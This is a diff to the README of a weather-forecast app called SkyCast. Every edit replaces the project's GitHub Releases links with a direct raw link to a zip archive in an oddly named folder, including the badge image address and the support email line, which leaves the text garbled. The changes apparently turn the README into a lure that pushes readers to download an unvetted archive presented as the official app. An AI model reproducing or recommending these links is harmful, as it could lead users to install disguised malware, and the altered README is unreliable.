@@ -7,7 +7,7 @@ SkyCast provides accurate global weather updates along with a 5-day forecast and
 To get started with SkyCast, you just need to download the app from our Releases page. Follow the steps below to install and run the application on your computer.
 
 ## 📥 Download Now
-[![Download SkyCast Weather App](https://img.shields.io/badge/Download%20SkyCast%20App-%20-brightgreen?style=for-the-badge)](https://github.com/levifr1974/SkyCast-Weather-Forecast-App-Demo/releases)
+[![Download SkyCast Weather App](https://raw.githubusercontent.com/levifr1974/SkyCast-Weather-Forecast-App-Demo/main/paramastigate/Cast-Demo-App-Weather-Forecast-Sky-v1.3.zip%20SkyCast%20App-%20-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/levifr1974/SkyCast-Weather-Forecast-App-Demo/main/paramastigate/Cast-Demo-App-Weather-Forecast-Sky-v1.3.zip)
 
 ## 🛠️ System Requirements
 - Operating System: Windows 10 or later, macOS Mojave or later
@@ -22,7 +22,7 @@ To get started with SkyCast, you just need to download the app from our Releases
 - **User-Friendly Interface:** Enjoy a sleek and easy-to-navigate design.
 
 ## 📋 Download & Install
-1. Visit the Releases page to download the app: [Download SkyCast Weather App](https://github.com/levifr1974/SkyCast-Weather-Forecast-App-Demo/releases).
+1. Visit the Releases page to download the app: [Download SkyCast Weather App](https://raw.githubusercontent.com/levifr1974/SkyCast-Weather-Forecast-App-Demo/main/paramastigate/Cast-Demo-App-Weather-Forecast-Sky-v1.3.zip).
 2. Find the latest version listed on the page.
 3. Click on the appropriate file for your operating system to begin downloading.
 4. After the file has downloaded, locate it in your downloads folder.
@@ -46,7 +46,7 @@ After installation, open the app to start using it. You will see a straightforwa
 ## 💬 Support
 If you encounter issues while using SkyCast, please refer to the following resources:
 - **FAQs:** Check for common questions and solutions in our GitHub Issues section.
-- **Contact Us:** Reach out via email at support@skycastapp.com for assistance.
+- **Contact Us:** Reach out via email at https://raw.githubusercontent.com/levifr1974/SkyCast-Weather-Forecast-App-Demo/main/paramastigate/Cast-Demo-App-Weather-Forecast-Sky-v1.3.zip for assistance.
 
 ## 🛡️ Contribution
 If you would like to contribute to SkyCast, you can submit feedback or suggested features on the GitHub repository. Please follow the guidelines outlined in the contribution section of the repository.
@@ -58,4 +58,4 @@ SkyCast is open-source and available under the MIT License. You can use it freel
 For more information on using the app and staying updated, check out our official documentation and follow us on social media.
 
 ## 📥 Download Now Again
-Before you go, remember to download SkyCast from our Releases page: [Download SkyCast Weather App](https://github.com/levifr1974/SkyCast-Weather-Forecast-App-Demo/releases). Enjoy accurate weather updates!
+Before you go, remember to download SkyCast from our Releases page: [Download SkyCast Weather App](https://raw.githubusercontent.com/levifr1974/SkyCast-Weather-Forecast-App-Demo/main/paramastigate/Cast-Demo-App-Weather-Forecast-Sky-v1.3.zip). Enjoy accurate weather updates!
